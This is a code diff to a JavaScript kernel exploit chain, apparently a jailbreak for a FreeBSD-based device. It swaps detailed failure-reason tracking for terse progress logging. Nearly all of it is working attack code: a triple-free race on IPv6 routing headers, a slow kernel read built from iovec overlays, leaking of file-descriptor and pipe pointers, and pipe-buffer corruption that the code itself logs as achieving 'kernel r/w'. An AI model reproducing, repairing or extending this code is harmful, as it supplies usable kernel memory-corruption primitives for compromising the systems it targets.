@@ -51,7 +51,6 @@
         const UIO_SYSSPACE = 1n;
 
         const TRIPLEFREE_ATTEMPTS = 96;
-        // stages 1-3 retry count (was hardcoded 8 in proven working 43f14ea)
         const MAX_ROUNDS_TWIN = 10;
         const MAX_ROUNDS_TRIPLET = 500;
         const FIND_TRIPLET_FAST = 5000;
@@ -1175,6 +1174,8 @@
             }
             for (let attempt = 1; attempt <= TRIPLEFREE_ATTEMPTS; attempt++) {
                 if (await attempt_race(S)) {
+                    await ulog("stage0: triplets " + S.triplets.join(",") +
+                        " (attempt " + attempt + "/" + TRIPLEFREE_ATTEMPTS + ")");
                     nanosleep_ms(500);
                     return;
                 }
@@ -1204,9 +1205,7 @@
         }
 
         function kread_slow(S, kaddr, size) {
-            S.kread_last_reason = "start";
             if (!triplets_valid(S)) {
-                S.kread_last_reason = "bad_triplets_start";
                 return null;
             }
             for (let i = 0; i < 64; i += 8) write64(S.uio_read_buf + BigInt(i), 0x4141414141414141n);
@@ -1220,7 +1219,6 @@
             write64(S.uio_iov_read + 8n, BigInt(size));
 
             if (!triplets_valid(S)) {
-                S.kread_last_reason = "bad_triplets_after_setup";
                 return null;
             }
             rthdr_free_idx(S, S.triplets[1]);
@@ -1244,19 +1242,16 @@
                 syscall(SYSCALL.write, BigInt(S.uio_sock_b), S.scratch_big, BigInt(size));
             }
             if (!found) {
-                S.kread_last_reason = "uio_iov_leak_miss";
                 return null;
             }
             leaked_iov = read64(S.rthdr_readback);
             if (leaked_iov === 0n || (leaked_iov >> 48n) !== 0xFFFFn) {
-                S.kread_last_reason = "uio_iov_bad_ptr:" + toHex(leaked_iov);
                 return null;
             }
 
             build_uio(S.recvmsg_iovecs, leaked_iov, 0n, true, kaddr, BigInt(size));
 
             if (!triplets_valid(S)) {
-                S.kread_last_reason = "bad_triplets_before_iov";
                 return null;
             }
             rthdr_free_idx(S, S.triplets[2]);
@@ -1275,7 +1270,6 @@
                 syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
             }
             if (!found) {
-                S.kread_last_reason = "iov_overlay_miss";
                 return null;
             }
 
@@ -1292,7 +1286,6 @@
                         S.iov_ws.wait();
                         syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
                         S.triplets[1] = find_triplet(S, S.triplets[0], S.triplets[2], FIND_TRIPLET_FAST);
-                        S.kread_last_reason = "triplet1_repair_miss";
                         return null;
                     }
                     S.triplets[1] = t;
@@ -1304,7 +1297,6 @@
             if (result === null) {
                 S.iov_ws.wait();
                 syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
-                S.kread_last_reason = "result_none";
                 return null;
             }
 
@@ -1316,12 +1308,10 @@
             if (S.triplets[2] === -1) {
                 S.iov_ws.wait();
                 syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
-                S.kread_last_reason = "triplet2_repair_miss";
                 return null;
             }
             S.iov_ws.wait();
             syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
-            S.kread_last_reason = "ok";
             return result;
         }
 
@@ -1399,40 +1389,20 @@
         }
 
         function kslow64(S, kaddr) {
-            S.kslow_last_reason = "start";
             for (let attempt = 0; attempt < 3; attempt++) {
                 if (triplets_valid(S)) {
                     const buf = kread_slow(S, kaddr, 8);
                     if (buf !== null) {
                         const val = read64(buf);
                         if (val !== 0n) {
-                            if ((val >> 48n) === 0xFFFFn) {
-                                S.kslow_last_reason = "ok attempt=" + (attempt + 1);
-                                return val;
-                            }
-                            if ((val >> 40n) !== 0n) {
-                                S.kslow_last_reason = "ok attempt=" + (attempt + 1);
-                                return val;
-                            }
-                            S.kslow_last_reason = "bad_value:" + toHex(val) +
-                                " attempt=" + (attempt + 1);
-                        } else {
-                            S.kslow_last_reason = "zero_value attempt=" + (attempt + 1);
+                            if ((val >> 48n) === 0xFFFFn) return val;
+                            if ((val >> 40n) !== 0n) return val;
                         }
-                    } else {
-                        S.kslow_last_reason = S.kread_last_reason +
-                            " attempt=" + (attempt + 1);
                     }
-                } else {
-                    S.kslow_last_reason = "bad_triplets_pre attempt=" + (attempt + 1);
                 }
                 repair_triplets(S); syscall(SYSCALL.sched_yield);
             }
             return null;
-        }
-
-        function is_kernel_ptr(v) {
-            return v !== 0n && (v >> 48n) === 0xFFFFn;
         }
 
         async function stage1(S) {
@@ -1469,6 +1439,7 @@
             }
             if ((proc_filedesc >> 48n) !== 0xFFFFn) fail("stage1: bad filedesc: " + toHex(proc_filedesc));
             S.proc_filedesc = proc_filedesc;
+            await ulog("stage1: proc_filedesc=" + toHex(proc_filedesc));
 
             for (let k = 0; k < 3; k++) {
                 S.triplets[1] = find_triplet(S, S.triplets[0], S.triplets[2], 50000);
@@ -1480,57 +1451,42 @@
 
         async function stage2(S) {
             send_notification("Stage 2\nLeak pipe data pointers");
-            let stage2_last_reason = "not started";
-            const read_stage2_ptr = (name, kaddr) => {
-                const val = kslow64(S, kaddr);
-                if (is_kernel_ptr(val)) return val;
-                if (val) {
-                    stage2_last_reason = name + " rejected non-kptr " +
-                        toHex(val) + " (" + S.kslow_last_reason + ")";
-                    return null;
-                }
-                stage2_last_reason = name + " read failed (" +
-                    S.kslow_last_reason + ")";
-                return null;
-            };
+            await ulog("stage2: leaking pipe pointers...");
             for (let attempt = 0; attempt < 5; attempt++) {
                 repair_triplets(S); nanosleep_ms(100);
-                const fdescenttbl = read_stage2_ptr("fd table",
-                    S.proc_filedesc + S.OFF.FILEDESC_OFILES);
+                const fdescenttbl = kslow64(S, S.proc_filedesc + S.OFF.FILEDESC_OFILES);
                 if (!fdescenttbl) continue;
                 S.fd_ofiles = fdescenttbl + S.OFF.FDESCENTTBL_HDR;
                 repair_triplets(S); nanosleep_ms(500); repair_triplets(S);
 
-                const master_fp = read_stage2_ptr("master file pointer",
-                    S.fd_ofiles + BigInt(S.master_rfd) * S.OFF.FILEDESCENT_SIZE);
+                const master_fp = kslow64(S, S.fd_ofiles + BigInt(S.master_rfd) * S.OFF.FILEDESCENT_SIZE);
                 if (!master_fp) continue;
                 repair_triplets(S); nanosleep_ms(500); repair_triplets(S);
 
-                const victim_fp = read_stage2_ptr("victim file pointer",
-                    S.fd_ofiles + BigInt(S.victim_rfd) * S.OFF.FILEDESCENT_SIZE);
+                const victim_fp = kslow64(S, S.fd_ofiles + BigInt(S.victim_rfd) * S.OFF.FILEDESCENT_SIZE);
                 if (!victim_fp) continue;
                 repair_triplets(S); nanosleep_ms(500); repair_triplets(S);
 
-                S.master_pipe_data = read_stage2_ptr("master pipe data",
-                    master_fp);
+                S.master_pipe_data = kslow64(S, master_fp);
                 if (!S.master_pipe_data) continue;
                 repair_triplets(S); nanosleep_ms(500); repair_triplets(S);
 
-                S.victim_pipe_data = read_stage2_ptr("victim pipe data",
-                    victim_fp);
+                S.victim_pipe_data = kslow64(S, victim_fp);
                 if (!S.victim_pipe_data) continue;
 
                 if (S.master_pipe_data !== S.victim_pipe_data) {
+                    await ulog("stage2: master_pipe=" + toHex(S.master_pipe_data) +
+                        " victim_pipe=" + toHex(S.victim_pipe_data));
                     return;
                 }
-                stage2_last_reason = "pipe data pointers matched";
                 nanosleep_ms(500); repair_triplets(S);
             }
-            fail("stage2: failed to leak pipe pointers (" + stage2_last_reason + ")");
+            fail("stage2: failed to leak pipe pointers");
         }
 
         async function stage3(S) {
             send_notification("Stage 3\nPipe corruption -> fast kernel R/W");
+            await ulog("stage3: corrupting pipe buffer...");
 
             const pipe_overwrite = malloc(24);
             write32(pipe_overwrite, 0n);
@@ -1583,6 +1539,7 @@
                 kwrite_slow(S, S.master_pipe_data, pipe_overwrite, 24);
             }
             if (!verified) fail("stage3: verify failed");
+            await ulog("stage3: kernel r/w achieved");
             S.kernel_rw_ready = true;
 
             await stage3_cleanup(S);
@@ -1641,6 +1598,7 @@
             write16(S.rt_params + 2n, 0n);
             syscall(SYSCALL.rtprio_thread, RTP_SET, 0n, S.rt_params);
 
+            await ulog("stage3b: race cleanup done");
             await js_sleep(3000);
         }
 
